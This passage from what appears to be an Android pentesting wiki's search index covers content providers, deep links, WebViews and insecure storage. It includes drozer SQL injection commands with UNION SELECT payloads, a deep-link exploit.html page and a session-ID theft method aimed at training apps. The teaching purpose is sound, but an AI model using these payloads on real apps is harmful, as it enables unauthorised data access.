testing:</p> <pre><code>app.provider.columns \u00a0 \u00a0app.provider.read \u00a0 app.provider.insert\n</code></pre> <pre><code>app.provider.download \u00a0 \u00a0app.provider.finduri \u00a0 app.provider.info\n</code></pre> <pre><code>app.provider.query \u00a0 app.provider.delete \u00a0 app.provider.update\n</code></pre> <p>For example,</p> <p>we want to delete title column we can use <code>app.provider.delete</code> \u00a0module </p> <p></p> <p>In this way we can perform different operations here. </p>"},{"location":"Pentesting/Android/content-providers/#sql-injection","title":"SQL Injection","text":"<p>This is different from web sql injection here we only target local databases and we also need vulnerable content provider to submit our query. basically manipulating --selection &amp; --projection part we can able to dump data.</p> <p>Let's see that when we submit something unexpected in query how it will react. such as special character /, *, \u00a0'.</p> <p></p> <p>After submitting \"@\" as projection then we are getting error with actual query on background this can be done through source code also but while doing this we actually understand how provider is reacting to our inputs.</p> <p>SELECT [Projection] From notes ORDER BY title - backend query</p> <p>If we want to request whole stuff from \u00a0notes our backend query will be </p> <p>SELECT * From notes ORDER BY title and input query will be * let's see that if it is work.</p> <p>yes it works!</p> <p></p> <p>Now we want tables from whole system so we have to look for SQLITE_MASTER table for that we can query </p> <p>SELECT * FROM SQLITE_MASTER -- ~~notes ORDER BY title~~</p> <p>What basically this query will do it gonna select everything from sqlite_master and \"--\" end up \u00a0the query and remaining part will become a comment. so now our input query will be </p> <p> * FROM SQLITE_MASTER--</p> <p>Let's try if it works:</p> <p></p> <p>And it works. In this way we can approach for SQL injection in android.</p> <p>We cover pretty much about content provider from basics to exploitation's.</p>"},{"location":"Pentesting/Android/content-providers/#sql-injection-scanner","title":"SQL Injection Scanner","text":"<p>By using drozer we can also scan for automatic sql injection.</p> <p></p>"},{"location":"Pentesting/Android/content-providers/#file-provider-based-vulnerabilities","title":"File Provider Based Vulnerabilities","text":"<p>Arbitrary File Access:</p> <p>Similar as data we can access files from the system if we have file-provider.</p> <p>Path Transversal: (Automatic Scanner)</p> <p></p>"},{"location":"Pentesting/Android/deep-dive-into-activities/","title":"Deep Dive into Activities","text":""},{"location":"Pentesting/Android/deep-dive-into-activities/#deep-dive-into-activities","title":"Deep Dive into Activities","text":"<p>An activity is something that interacts with the user on the screen. They come in a variety of shapes and sizes, including floating windows, Multi-Window Mode, and windows embedded within windows. Every app must have at least one activity called MainActivity, which will run immediately after the app is launched.</p> <p>Activities can be vulnerable to Authentication/Authorization vulnerabilities depending on their function. Aside from that, there are Deeplink and WebView activities that are most likely exploitable. We'll go through what they are and how to exploit them in detail. Take a quick look at the activity lifecycle before moving on.</p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#stages-of-activity-life-cycle","title":"Stages of Activity Life-cycle","text":"<ul> <li> <p>Initialized: Activity instance is created and its properties initialized. </p> </li> <li> <p>Created: Activity is now completely initialized and ready to configure its UI. </p> </li> <li> <p>Started: Activity is visible to the user. </p> </li> <li> <p>Resumed: Activity is visible to the user and has focus. In this state, the user is likely interacting with the activity. </p> </li> <li> <p>Destroyed: Activity is destroyed and the OS can reclaim its memory.</p> </li> </ul> <p>In a security perspective life-cycle callbacks are much important let's have look:</p> <p></p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#life-cycle-callbacks","title":"life-cycle callbacks","text":"<ul> <li> <p>onCreate(): This will execute when the activity is created. All userfacing work such as views, list are all done at this time.</p> </li> <li> <p>onStart(): It Invoked when user actually able to see the activity, as well as when activity is restart this will called.</p> </li> <li> <p>onResume(): It will start when user start interacting with users. also it will called when activity is resume.</p> </li> <li> <p>onPause(): When we sent any app in the recent but not exit from it at this time the activity goes in pause. when it comes on front screen onResume is being called.</p> </li> <li> <p>onStop(): It Invoked when user is not able see the activity.</p> </li> <li> <p>onDestroy(): This is final call of lifecycle before destroying or killing activity.</p> </li> <li> <p>OnRestart(): This being called after activity has been stopped and prior to its starting stage.</p> </li> </ul> <p>Declaration of Activity:</p> <p><code>&lt;manifest ... &gt;</code></p> <p> <code>&lt;application ... &gt;</code></p> <p> <code>&lt;activity android:name=\".ExampleActivity\" /&gt;</code></p> <p> <code>...</code></p> <p> <code>&lt;/application&gt;</code></p> <p> <code>...</code></p> <p><code>&lt;/manifest&gt;</code></p> <p>How To Approach:</p> <p></p> <p>White lines indicate prerequisites, Red lines indicate Deeplink Vulnerabilities, and green lines indicate that the vulnerability can be exploited using WebView, and if we exploit deeplink via WebView, the same vulnerabilities may be exploitable.</p> <p>For Example. If we want to look for XSS, thus we'll need either a web view or a deep link that may be exploited in a webview. Other requirements include setJavascriptEnabled(true) with exported activity and missing permissions. or If I have an exported activity with missing permissions, we must look for any of these functions, and if we find loadData(), we will store our malicious script in a single string and pass it to loadData(), which returns Rendering HTML or loading arbitrary sites, or XSS if we have a javascript enabled function.</p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#what-are-the-deeplinks","title":"What are the DeepLinks ?","text":"<p>Deep links allow us to trigger an intent via URL, embedded in a website. This allows the app to start and pass in data.</p> <p>How to identify ? </p> <p>We can look for scheme tag with Browsable Category in AndroidManifest.xml File.</p> <p>Example:</p> <p> <code>&lt;intent-filter&gt;</code></p> <p> <code>&lt;action android:name=\"android.intent.action.VIEW\"/&gt;</code></p> <p> <code>&lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;</code></p> <p> <code>&lt;data android:scheme=\"http\"</code> </p> <p> <code>android:host=\"example.com\"</code></p> <p> <code>android:path=\"/webview\"</code></p> <p> <code>&lt;/intent-filter&gt;</code></p> <p>This is best example of deep link.</p> <p>Structure of deep link structure is </p> <p><code>&lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;[&lt;path&gt;|&lt;pathPrefix&gt;|&lt;pathPattern&gt;]</code></p> <p>So accordingly our deep link will be http://example.com/webview and this will help us to trigger webview of the app which we'll cover later but for now let's understand how to exploit deep link.</p> <p>Loading Arbitrary Sites:</p> <p>For demo purpose we need insecureshop apk </p> <p>Decompile Apk ( Don't know how ? checkout Reversing APK )</p> <p>AndroidManifest.xml &gt; </p> <p><code>&lt;intent-filter&gt;</code></p> <p> <code>&lt;action android:name=\"android.intent.action.VIEW\"/&gt;</code></p> <p> <code>&lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;</code></p> <p> <code>&lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;</code></p> <p> <code>&lt;data android:host=\"insecureshop\" android:host=\"com.insecureshop\" \u00a0 \u00a0 \u00a0 \u00a0&lt;/intent-filter&gt;</code></p> <p>As previously explained our deep link will be insecureshop://com.insecureshop because we got only this much information from AndroidManifest file first test that can we trigger app with this or not. Save following code in exploit.html</p> <p><code>&lt;html&gt;</code></p> <p><code>&lt;body&gt;&lt;a href=\"insecureshop://com.insecureshop\"&gt;Start Attack&lt;/a&gt;</code></p> <p><code>&lt;/body&gt;</code></p> <p><code>&lt;html&gt;</code></p> <p>Host the file locally by pushing exploit in the device</p> <p></p> <p>or Remote server </p> <p></p> <p>As you can see, we may activate the app via a deep link contained in a web-page. But wait, that's not a flaw, it's a feature!</p> <p></p> <p>Let's check the class of the activity if we find something might exploitable.</p> <p></p> <p>If we look into code then we have two paths /web and /webview where input string will execute according to condition is being satisfy. </p> <p>so our exploit will be </p> <pre><code>&lt;html&gt;\n\n&lt;body&gt;&lt;a href=\"insecureshop://com.insecureshop/web?url=http://bing.com\"&gt;Start Attack&lt;/a&gt;\n\n&lt;/body&gt;\n\n&lt;html&gt;\n</code></pre> <p></p> <p>This is one of the example that how we can load any arbitrary websites to victims app. \u00a0also this may vary app to app depends on path, functions and conditions that activity class been specified.</p> <p>Stealing Sensitive Information:</p> <p>Another attack vector for exploiting deeplinks could be stealing sensitive information from victim app.</p> <p>Consider while playing with burpsuite, looking into hardcoded data or by any other method we found one endpoint which maybe api/v2/apikey=\"\", api/v2/userinfo=\"\", /sessionID=\"\". \u00a0and while you are authenticated you got some info in your app. </p> <p>Now we design our payload according to same \"<code>insecureshop://com.insecureshop/web?sessionID=</code>\" now as victim click on that in his app the webview will render with the information that directory actually present and we got that info on our server. </p> <p>This is how we can steal sensitive information from victims app. </p> <p>Cross Site Request Forgery:</p> <p>In CSRF we basically trick user to do some unwanted actions the best example of CSRF is https://hackerone.com/reports/583987 In perscope app researcher able to force victim to follow.</p> <p>In our case that might be <code>\" Insecureshop://com.insecureshop/follow</code>\".</p> <p>Insufficient URL Validation:</p> <p>Most of time the app is not properly validate the URL such as it ignore backslash, forward slash, IDN Homographic characters etc. that leads to different kind of attacks such as Open Redirection, Injecting malicious script or disclosing internal information.</p> <p>Consider \"<code>Insecureshop://com.insecureshop/\"</code> this is expected URL to app. but what if \"<code>Insecureshop://com.insecureshop/?url=bing.com/\\\\alert()\"</code> and it ignored first url and execute our payload or with this domain it also executed our payload that will become big attack vector for us. </p> <p>Let's have look into Webview:</p> <p>WebViews are effectively web browsers embedded into Android Apps. WebViews content can be pulled from remote sites or can be files included in the app. WebViews are vulnerable to the same vulnerabilities affecting any web browsers. However there are some configurations that can be useful to limit the attack surface. Types: WebChromeClient &amp; WebViewClient.</p> <p>In webviewclient is only render the html no javascript can execute in webviewclient whereas WebChromeClient has enabled javascript so xss payloads possible possible to execute.</p> <p>Sample Code to identify webview</p> <pre><code>&lt;WebView\n\nandroid:id=\"@+id/webview\"\n\nandroid:layout_width=\"match_parent\"\n\nandroid:layout_height=\"match_parent\"\n\n/&gt;\n</code></pre> <p>AndroidManifest.xml</p> <pre><code>Uri uri = getIntent().getData();\n\nif(uri != null)`&amp;#x20;\n\n{\n\nwebView.loadUrl(uri);\n\n}\n</code></pre> <p>WebviewActivity.class</p> <p></p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#sensitive-information-disclosure","title":"Sensitive Information Disclosure","text":"<p>In Web browser we actually get UI or shell where user can able to search something input is given by user. but Accessing Native apps in browser is not possible. whereas In webview accessing native apps are possible with the help of Javascript interface webview because it provides javascript bridge and Native bridge. </p> <p>Now incase if you found addjavascriptinterface() that might vulnerable for runtime code execution \u00a0check https://labs.f-secure.com/advisories/webview-addjavascriptinterface-remote-code-execution/</p> <p>Framework such as cordova framework which is used to build mobile apps, they might vulnerable for accessing internal information such as contact list with the help of navigator.contacts.</p> <p>other than this we have setAllowConentAccess() function which invoke content provider can allow to pass URI with content:// scheme so if there is any content provider handling any sensitive information then we might able to retrieve that information.</p> <p>Rendering HTML &amp; Cross Site Scripting:</p> <p>In case if we found a webviewactivity exported without any permissions we will firstly look for loadURL(), loadData() and Javascriptenabled() functions we look for either loading random HTML code or Cross Site Scripting(bit different than web cause here we don't have access to Cookies)</p> <p>Following code is the example if we found loadData function so firstly we gonna store our html in one string and then it pass to function.</p> <pre><code>String data = \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;LoadData Function Test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\";\n</code></pre> <pre><code>mywebview.loadData(data, \"text/html\", \"UTF-8\");\n</code></pre> <p>If we have loadURL() function then we can directly pass URL to activity and load arbitrary websites.</p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#arbitrary-file-access","title":"Arbitrary File Access:","text":"<p>Following functions allow to pass file:// scheme and allow local files via webview. </p> <p><code>setAllowUniversalAccessFromFileURLs()</code></p> <p><code>setAllowFileAccessFromFileURLs()</code></p> <p><code>setAllowFileAccess()</code></p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#authentication-authorization-vulnerabilities","title":"Authentication &amp; Authorization Vulnerabilities","text":"<p>This section is with rare scenarios . </p> <p>1.Suppose we have 3 activities login, 2FA &amp; Dashboard activity.</p> <p>If Dashboard Activity is exported and permissions are missing then after login we may directly able to start activity now if there is no proper configuration we can able to bypass 2FA.</p> <p>2. Now Another case while looking into source code we may found activity of function which is only accessible by admin and not by normal users so if that activity is exported and with no mandatory permission we can able to start that activity access that functionality. In this way we can bypass Authorization.</p> <p>Privilege Escalation:</p> <p>Sometimes \u00a0one activity is protected but it can start with another activity which is exported. \u00a0https://hackerone.com/reports/200427 In this report researcher did same thing start protected webview activity with exported activity.</p> <p>This kind of vulnerabilities are rare and may vary app to app.</p>"},{"location":"Pentesting/Android/deep-dive-into-activities/#references","title":"References","text":"<ul> <li> <p>https://www.tutorialspoint.com/android/android_acitivities.htm</p> </li> <li> <p>https://www.javatpoint.com/android-life-cycle-of-activity</p> </li> <li> <p>https://developer.android.com/guide/components/activities/intro-activities</p> </li> <li> <p>https://www.hackingarticles.in/android-pentest-deep-link-exploitation/</p> </li> <li> <p>https://medium.com/mobis3c/deep-link-exploitation-introduction-open-unvalidated-redirection-b8344f00b17b</p> </li> <li> <p>https://security.oppo.com/en/noticeDetail?notice_only_key=NOTICE-1359026676922851328</p> </li> <li> <p>https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html</p> </li> </ul>"},{"location":"Pentesting/Android/extraneous-functionality/","title":"Extraneous Functionality","text":""},{"location":"Pentesting/Android/extraneous-functionality/#extraneous-functionality","title":"Extraneous Functionality","text":""},{"location":"Pentesting/Android/extraneous-functionality/#javascript-enable-in-a-webview","title":"JavaScript Enable in a Webview","text":"<p>The mobile application has enabled JavaScript in WebView. By default, JavaScript is disabled in WebView, if enabled it can bring various JS-related security issues, such as Cross-Site Scripting (XSS) attacks.</p> <p>Example of insecure code: </p><pre><code>WebSettings settings = webView.getSettings();\nsettings.setJavaScriptEnabled(true);\n</code></pre>"},{"location":"Pentesting/Android/improper-error-handling/","title":"Improper Error Handling","text":""},{"location":"Pentesting/Android/improper-error-handling/#improper-error-handling","title":"Improper Error Handling","text":"<p>Error handling is not properly done, and the API is throwing database/server errors specific to the crafted request, it is possible to craft attacks using those errors.</p>"},{"location":"Pentesting/Android/improper-error-handling/#content-provider-leakage","title":"Content Provider Leakage","text":"<p>According to Google Android Security application can't share data with another application until it's allow to share. If application assign content:// to any application that means it's provide content to particular application.</p>"},{"location":"Pentesting/Android/improper-error-handling/#content-provider-leakage_1","title":"Content provider leakage","text":"<p>By using Drozer to perform various attacks on content providers. We can find out the package name of our target application using the command shown as follows:</p> <ol> <li>Run app.package.list to list the packages installed on the device: <pre><code>#run app.package.list -f {appname}\n</code></pre></li> <li>Run app.package.attacksurface to analyze the attack surface of a specific package (e.g., com.sonyericsson.notes): <pre><code>#run app.package.attacksurface com.sonyericsson.notes\n</code></pre></li> <li>Run scanner.provider.finduris to find content provider URIs associated with a package: <pre><code>#run scanner.provider.finduris -a [package name]\n</code></pre></li> <li>Example usage of scanner.provider.finduris with a specific package (com.sonyericsson.notes): <pre><code>#run scanner.provider.finduris -a com.sonyericsson.notes\n</code></pre></li> <li>Run app.provider.query to query a content provider URI <pre><code>#run app.provider.query [content provider URI]\n</code></pre></li> <li>Example usage of app.provider.query with a specific content provider URI (content://com.sonyericsson.notes.provider): <pre><code>#run app.provider.query content://com.sonyericsson.notes.provider\n</code></pre></li> <li>Run app.provider.query with the --vertical option for a vertical view: <pre><code>#run app.provider.query [URI] --vertical (For Vertical view)\n</code></pre></li> <li>Example usage of app.provider.query with a specific URI (content://com.sonyericsson.notes.provider.Note/notes/) and the --vertical option: <pre><code>#run app.provider.query content://com.sonyericsson.notes.provider.Note/notes/ --vertical\n</code></pre></li> </ol>"},{"location":"Pentesting/Android/improper-error-handling/#attacking-sql-injection-using-drozer","title":"Attacking SQL Injection using Drozer","text":"<ol> <li>#run scanner.provider.injection -a [package name]</li> <li>#run scanner.provider.injection -a com.sonyericsson.notes</li> <li>#run app.provider.query content://com.sonyericsson.notes.provider. Note/notes/ --selection \"{sqlpayload}\"</li> <li>#run app.provider.query content://com.sonyericsson.notes.provider. Note/notes/ --selection \"_id=1\"</li> <li>#run app.provider.query content://com.sonyericsson.notes.provider. Note/notes/ --sele,ction \"_id=1=1)union select 1,2,3,4,5,6,7,8,9,10,11,12, 13,14 from sqlite_master where (1=1\"</li> <li>#run app.provider.query content://com.sonyericsson.notes.provider. Note/notes/ --selection \"_id=1=1)union select 1,2,3,4,sqlite_ version(),6,7,8,9,10,1112,13,14 from sqlite_master where (1=1\"</li> </ol>"},{"location":"Pentesting/Android/improper-input-validation/","title":"Improper Input Validation","text":""},{"location":"Pentesting/Android/improper-input-validation/#improper-input-validation","title":"Improper Input Validation","text":""},{"location":"Pentesting/Android/improper-input-validation/#exploiting-sql-injection-in-mobile-application-frameworks","title":"Exploiting SQL injection in mobile application frameworks","text":"<p>Basically sql injection in mobile application is similar like web application. There's same payload used to exploit this vuln. But the advantage in this case is that we can see the source code and can check if the developer not properly validate or filter the data that passed through the input field.</p> <p>Ex. Diva: SQL</p> <p>Simply analyzing the source code where file contain sql query check it is not closing properly use blah'1 OR '1=1' It will showing you all the things.</p>"},{"location":"Pentesting/Android/improper-input-validation/#frame-injection-in-webview-or-cross-site-scripting","title":"Frame Injection in WebView or Cross Site Scripting","text":"<p>If any application allows user to view a webpage against the user input or can say if String convert into hyperlink and show webpage in a frame in Activity so it's vulnerable with Frame Injection. Attacker use this vulnerability to perform XSS and Phishing attack etc.</p> <p>Vulnerability occurs when the app is validating user Input and allows to parse malicious script.</p> <p>Ex. DIVA:</p> <p>In Diva Input validation 2 issues Section, the feature is to render website in webkit but when the user pass file:/// or any path directory it's allow user to access.</p>"},{"location":"Pentesting/Android/improper-session-handling/","title":"Improper Session Handling","text":""},{"location":"Pentesting/Android/improper-session-handling/#improper-session-handling","title":"Improper Session Handling","text":"<p>There are few cases related to Session Handling some are:</p> <ul> <li>Session is managing from backend or Server, For Example, If user signed out from the app so session is deleted from the devices but not deleting or expire from the Server.</li> <li>Session token timeout not set, it comes in Insecure Token Creation if develop not set token expiration time or set for long time valid session.</li> </ul>"},{"location":"Pentesting/Android/insecure-data-storage/","title":"Insecure data Storage","text":""},{"location":"Pentesting/Android/insecure-data-storage/#insecure-data-storage","title":"Insecure data Storage","text":"<p>Insecure data storage vulnerabilities occur when development teams assume that users or malware will not have access to a mobile device's filesystem and subsequent sensitive information in data-stores on the device.</p> <p>Google advice should not store any of class or executable or any senstive information to external storage because other application can bind and steal the data.</p> <ul> <li>To check any sensitive information or class store in External Storage</li> </ul> <p>1.\u00a0Decompile the apk to jar or unzip. \u00a0</p> <p>2.\u00a0Look app permission in AndroidManifest.xml.</p> <p></p> <p>and also can search in decompile class file.</p> <p></p>"},{"location":"Pentesting/Android/insecure-data-storage/#detecting-readwrite-to-external-storage","title":"Detecting read/write to External Storage","text":"<p>inotify: monitor files to fire an event after files are accessed or changed by any process on the device.</p>"},{"location":"Pentesting/Android/insecure-data-storage/#check-vulnerability-if-app-stores-data-in-mntsdcard","title":"Check vulnerability if app stores data in mnt/sdcard","text":"<p>1.\u00a0Open Vulnerable app and Login or typing in input field. \u00a0</p> <p>2.\u00a0Check the source code where application create file and giving name of the file by application. \u00a0</p> <p>3.\u00a0Navigate to file :</p> <pre><code>$cd mnt/sdcard/{file}\n</code></pre> <p>4.\u00a0Check the XML file if app vulnerable the entered data will be there | Developer think if they save file as .{file_name} so file will hidden and secure but it's not attacker easily escalate file.</p>"},{"location":"Pentesting/Android/insecure-data-storage/#check-vulnerability-if-app-stores-data-in-shared_pref","title":"Check vulnerability if app stores data in shared_pref","text":"<p>1.\u00a0Open Vulnerable app and Login or typing in input field. \u00a0</p> <p>2.\u00a0Navigate to:</p> <pre><code>$data/data/{app_name}/shared\\__pref\n</code></pre> <p>3.\u00a0Check the XML file if app vulnerable the entered data will be there.</p>"},{"location":"Pentesting/Android/insecure-data-storage/#check-vulnerability-if-app-stores-data-in-databases","title":"Check vulnerability if app stores data in databases","text":"<p>1.\u00a0Open Vulnerable app and Login or typing in input field. \u00a0</p> <p>2.\u00a0Navigate to:</p> <pre><code>$data/data/{app\\_name}/database\n</code></pre> <p>3.\u00a0Check the XML file if app vulnerable the entered data will be there.</p>"},{"location":"Pentesting/Android/insecure-data-storage/#check-vulnerability-if-app-stores-data-in-temp_file","title":"Check vulnerability if app stores data in temp_file","text":"<p>1.\u00a0Open Vulnerable app and Login or typing in input field. \u00a0</p> <p>2.\u00a0Check the source code where application create file and giving name of the file by application. \u00a0</p> <p>3.\u00a0Navigate to file :</p> <pre><code>$data/data/{appname}/{temp\\_file\\_as\\_name}\n</code></pre> <p>4.\u00a0Check the XML file if app vulnerable the entered data will be there.</p>"},{"location":"Pentesting/Android/insecure-data-storage/#backup-the-app-data-using-adb-backup-command","title":"Backup the app data using adb backup command","text":"<p>We can examine the internal memory of apps on non-rooted devices using the backup feature. Now let's use the backup technique of android to find security issues by following these steps:</p> <p>1.\u00a0Backup the app data using the adb backup command.</p> <p>We can backup an entire android phone using the following command:</p> <pre><code>#adb backup \u2013all \u2013shared \u2013apk\n</code></pre> <p>We can also store only a specific app using the following command:</p> <pre><code>#adb backup -f \\&lt;output\\_file&gt; \\&lt;package name&gt;\n</code></pre> <p>2.\u00a0Convert the .ab format to the .tar format using the android backup extractor.</p> <p>3.\u00a0Extract the TAR file using the pax or star utility.</p> <p>Note: Standard tools like tar and 7-Zip don't support untaring the files generated by abe.jar because they don't allow storing directories without trailing slash.</p> <p>4.\u00a0Analyze the extracted content from the previous step for security issues.</p>"},{"location":"Pentesting/Android/intent-and-intent-filters/","title":"Intent &amp; Intent Filters","text":""},{"location":"Pentesting/Android/intent-and-intent-filters/#intent-intent-filters","title":"Intent &amp; Intent Filters","text":""},{"location":"Pentesting/Android/intent-and-intent-filters/#intents","title":"Intents","text":"<p>We require intent to initiate activity, services, and provide Broadcasts, thus intent is highly crucial. In a nutshell, intent is used to communicate between Android components.</p> <p>There are two types of intents:</p> <ol> <li> <p>Explicit Intent: It is clearly specified in explicit intent what to do next, which is essentially the name of the component class or package name. Typically, explicit intent is used to start an app component. For example, a well-known component class.</p> </li> <li> <p>Implicit Intent: Implicit intent does not specify which package or component class to start; instead, it specifies which action to take. For example, the sharing function may offer a variety of options to the user, such as whatsapp, Instagram, or any other media, so the user will have a choice and then the specific action will be performed. For example, dial a phone number, look up a map, or go to a website.</p> </li> </ol> <p></p> <p>In the example above, the first action is to click on the Youtube channel name, and the second action is to share the video. Now see in first action app knows where to go, when you click on the channel name to go to the full screen profile of the channel, but In second action there is no mention of sharing because there are many other apps that support video sharing and are recommended to users based on the content type, category, and action to be taken. All of this was accomplished with the aid of an intent filter; let's have a look at what they are.</p> <p>As previously said, Intent Filters sort apps based on category, action, and content type, which is why they are significant.</p>"},{"location":"Pentesting/Android/intent-and-intent-filters/#some-important-terms","title":"Some Important terms","text":"<p>Action: This is essentially what to do; it can be user-defined or system-defined; nonetheless, the majority of the time, two actions are used. <code>ACTION SEND &amp; ACTION VIEW</code> When an app already has data, such as a photo or a URL, that the user can view, VIEW is used. When an app has data and wants to share it with another app, such as social networking or email, <code>SEND</code> is used. There are user-defined actions allowed. One example of a user-defined action is <code>ACTION TIMETRAVEL.</code></p> <p>Example:</p> <pre><code>&lt;action android:name=android.intent.action.VIEW&gt;\n\n&lt;action android:name=android.intent.action.VIEW&gt;\n</code></pre> <p>Data: The specification can be just a data type (the <code>mimeType</code> attribute), just a URI, or both a data type and a URI.</p> <p>Example:</p> <pre><code>&lt;data android:scheme=\"string\"\n\n\u00a0 \u00a0 android:host=\"string\"\n\n\u00a0 \u00a0 android:port=\"string\"\n\n\u00a0 \u00a0 android:path=\"string\"\n\n\u00a0 \u00a0 android:pathpattern=\"string\"\n\n\u00a0 \u00a0 android:mimeType=\"string\" /&gt;\n</code></pre> <p>Category: The purpose of the category is to specify what kind of application to be sort such as if category is browsable then it will show only the apps which can be able to browse something for example chrome, firefox.</p> <p>Example:</p> <p><code>&lt;category android:name=android.intent.category.BROWSABLE&gt;</code></p> <p>Extras: Additional information needed to complete the requested action is carried via key-value pairs. Some actions employ specific types of data URIs, while some actions use specific extras. Extra data is added to the intent using putExtras(), and that data is retrieved using getExtras(). These two arguments are required while doing so. The first is a key element, while the second is a key value.</p> <p>In adb \" --es \" we can use to send extra string to intent.</p>"},{"location":"Pentesting/Android/intent-and-intent-filters/#example-of-intent-filters","title":"Example of Intent Filters","text":"<pre><code>&lt;activity android:name=\"MainActivity\" android:exported=\"true\"&gt;\n\n\u00a0 \u00a0 &lt;!-- This activity is the main entry, should appear in app launcher -- &gt;\n\n\u00a0 \u00a0 &lt;intent-filter &gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n\n\u00a0 \u00a0 \u00a0&lt;/intent-filter&gt;\n\n&lt;/activity&gt;\n\n&lt;activity android:name=\"ShareActivity\" android:exported=\"false\"\n\n\u00a0 \u00a0 \u00a0 &lt;!-- This activity handles \"SEND\" action with text data -- &gt;\n\n\u00a0 \u00a0 \u00a0 &lt;intent-filter&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;action android:name=\"android.intent.action.SEND\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;data android:mimeType=\"text/plain\"/&gt;\n\n\u00a0 \u00a0 \u00a0 &lt;/intent-filter&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0&lt;!-- This activity also handles \"SEND\" and \"SEND_MULTIPLE\" with media data -- &gt;\n\n\u00a0 \u00a0 \u00a0 &lt;intent-filter&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;action android:name=\"android.intent.action.SEND\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;action android:name=\"android.intent.action.SEND_MULTIPLE\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;action android:name=\"android.intent.DEFAULT\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;action android:name=mimeType=\"application/vnd.google.panorama360+jpg\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;data android:mimeType=\"image/*\"/&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0&lt;data android:mimeTYpe=\"\"video/*\"&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0&lt;/intent-filter&gt;\n\n&lt;/activity&gt;\n</code></pre> <p>The first activity, <code>MainActivity</code>, is the app's main entry point\u2014the activity that opens when the user initially launches the app with the launcher icon:</p> <ul> <li> <p>The <code>ACTION_MAIN</code> action indicates this is the main entry point and does not expect any intent data.</p> </li> <li> <p>The <code>CATEGORY_LAUNCHER</code> category indicates that this activity's icon should be placed in the system's app launcher. If the <code>&lt;activity&gt;</code> element does not specify an icon with <code>icon</code>, then the system uses the icon from the <code>&lt;application&gt;</code> element.</p> </li> </ul> <p>These two must be paired together in order for the activity to appear in the app launcher.</p> <p>The second activity, <code>ShareActivity</code>, is intended to facilitate sharing text and media content. Although users might enter this activity by navigating to it from <code>MainActivity</code>, they can also enter <code>ShareActivity</code> directly from another app that issues an implicit intent matching one of the two intent filters.</p>"},{"location":"Pentesting/Android/intent-and-intent-filters/#pending-intents","title":"Pending Intents","text":"<p>A PendingIntent is a token you send to a other app's (such as NotificationManager, AlarmManager, Home Screen AppWidgetManager, or other 3<sup>rd</sup> party apps) that allows the other application to use \u00a0application's rights to run a preset piece of code.</p> <p>If Intent send to a other application, it will execute it with its own permissions. However, if PendingIntent given to a other application, that code will execute Intent with approval.</p>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/","title":"Mobile Infrastructure","text":""},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#mobile-infrastructure","title":"Mobile Infrastructure","text":""},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#android-startup-process","title":"Android Startup Process","text":""},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#android-security-model","title":"Android Security Model","text":"<ul> <li>Sandboxing: Android OS running application in Sandbox so application cannot interfere other Application Process nor data until permission granted. In Unix based model there is user ID consist in group, so if user allow permission it is also added in permission group ID.</li> <li>Secure Inter-Process Communication: IPC allows clients and server to exchange data across address such as intent, network.</li> <li>Application Signing: Android reject install of unsigned so application must be signed by self certificate.</li> <li>Permission Modal: If developer want any permission it should be define in Manifest.xml. to check granted group permission: #pm list permission -g</li> </ul> <p> Normal: Permissions which cannot be  a threat to user privacy or sensitive information such  as internet, vibrate device are falls under normal permissions.</p> <p> Dangerous: Permissions which could be a threat to user policy or data such as camera, location are falls under Dangerous permission. user must be allow this before app access any kind of data.</p> <p> Signature: Sytem grant permissions to requesting only if it match the signature.</p> <p> singnatureOrSignature: System grant the permission to requesting app either the app should system app or it should match the Signature.</p>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#android-file-system-and-data-structure","title":"Android File System and Data Structure","text":"<ul> <li> <p>Shared preferences: Shared preferences are XML files used to store non-sensitive preferences of an app as a key-value pair, usually of type boolean , float , int , long , and string .</p> </li> <li> <p>SQLite databases: SQLite databases are lightweight file-based databases that are commonly used in mobile environments. The SQLite framework is supported by Android too and so you can often find apps that use SQLite databases for their storage needs.</p> </li> <li> <p>Internal storage: Internal storage, also known as the device's internal storage, is used to save files to the internal storage. It provides a fast response to memory access requests due to its direct access and almost the entire app related data is used here, logically it's a hard disk of the phone. Each app creates its own directory during installation under /data/data/\\/, it is private to that application and other applications don't have access to this directory. This directory is cleared when the user uninstalls the application.</p> </li> <li> <p>External storage: External storage is a world writable and readable storage mechanism in Android which is used to store files. Any app can access this storage to read and write files, because of these reasons, sensitive files shouldn't be stored here.</p> </li> </ul>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#android-application-component","title":"Android Application Component","text":""},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#activities-services-broadcast-receiver-intents-etc","title":"Activities, Services, Broadcast Receiver, 